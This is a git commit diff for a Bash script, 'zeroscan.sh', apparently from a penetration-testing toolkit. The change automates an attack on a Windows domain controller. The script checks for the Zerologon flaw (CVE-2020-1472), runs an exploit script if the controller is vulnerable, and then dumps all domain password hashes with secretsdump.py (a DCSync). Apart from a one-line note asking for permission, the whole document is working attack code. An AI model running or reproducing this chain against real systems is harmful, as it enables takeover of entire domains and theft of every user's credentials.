59cc4d370f56af5fa2bcedf4ef85de4c705fc61d
sh1v4x6c <shiva108@protonmail.com>
2023-11-24 15:09:18 +0100

    zeroscan now includes exploitation

--- 2 quick/zeroscan.sh
+++ 2 quick/zeroscan.sh
@@ -2,35 +2,63 @@
 
 # Function to display usage
 usage() {
-    echo -e "\nSyntax: zeroscan.sh <DC NetBIOS name> <DC IP address>"
-    echo "Example: ./zeroscan.sh DC01 192.168.123.1"
-    echo -e "Hint: To find the DC NetBIOS name and IP, run 'ADnetscan.sh' & 'FindDCip.sh' found in '1 nocreds/'\n"
+    printf "\nSyntax: zeroscan.sh <DC NetBIOS name> <DC IP address>\n"
+    printf "Example: ./zeroscan.sh DC01 192.168.123.1\n"
+    printf "Runs zerologon check and exploits if vulnerable. Ensure to have permission to test the target.\n"
 }
 
 # Check for root privileges
 if [ "$(id -u)" -ne 0 ]; then
-    echo "Please run as root"
+    printf "Please run as root\n"
     exit 1
 fi
 
 # Check if the required number of arguments was provided
 if [ $# -ne 2 ]; then
-    echo "No arguments supplied or insufficient arguments provided"
+    printf "No arguments supplied or insufficient arguments provided\n"
     usage
-    exit 1
-fi
-
-# Check for required script
-if [ ! -f "./zerologon/zerologon.py" ]; then
-    echo "Error: zerologon.py script not found in the expected directory."
     exit 1
 fi
 
 NETBIOS_NAME="$1"
 DC_IP="$2"
+OUTPUT_FILE="exploit_${DC_IP}.txt"
+
+# Paths to scripts
+ZEROLOGON_SCRIPT="./zerologon/zerologon.py"
+EXPLOIT_SCRIPT="./CVE-2020-1472/cve-2020-1472-exploit.py"
+
+# Redirect stdout and stderr to the output file
+exec > >(tee "$OUTPUT_FILE") 2>&1
+
+# Check for required scripts
+if [ ! -f "$ZEROLOGON_SCRIPT" ]; then
+    printf "Error: zerologon.py script not found in the expected directory.\n"
+    exit 1
+fi
+
+if [ ! -f "$EXPLOIT_SCRIPT" ]; then
+    printf "Error: cve-2020-1472-exploit.py script not found in the expected directory.\n"
+    exit 1
+fi
 
 # Scans the target for the vulnerability
-echo "Scanning the target for the Zerologon vulnerability"
-python3 ./zerologon/zerologon.py "$NETBIOS_NAME" "$DC_IP"
+printf "Scanning the target for the Zerologon vulnerability\n"
+SCAN_RESULT=$(python3 "$ZEROLOGON_SCRIPT" "$NETBIOS_NAME" "$DC_IP")
 
-echo "Scan completed."
+echo "$SCAN_RESULT"
+
+# Check for successful zerologon scan and if exploit is complete
+if [[ "$SCAN_RESULT" == *"Success! DC can be fully compromised by a Zerologon attack."* ]]; then
+    printf "Vulnerability detected. Running CVE-2020-1472 exploit script...\n"
+    EXPLOIT_RESULT=$(python3 "$EXPLOIT_SCRIPT" "$NETBIOS_NAME" "$DC_IP")
+    echo "$EXPLOIT_RESULT"
+    if [[ "$EXPLOIT_RESULT" == *"Exploit complete!"* ]]; then
+        printf "Exploit completed successfully. Performing DCSync attack...\n"
+        secretsdump.py -just-dc "$NETBIOS_NAME"\$@"$DC_IP" -no-pass
+    fi
+else
+    printf "Target is not vulnerable or script failed to verify vulnerability.\n"
+fi
+
+printf "Scan completed.\n"
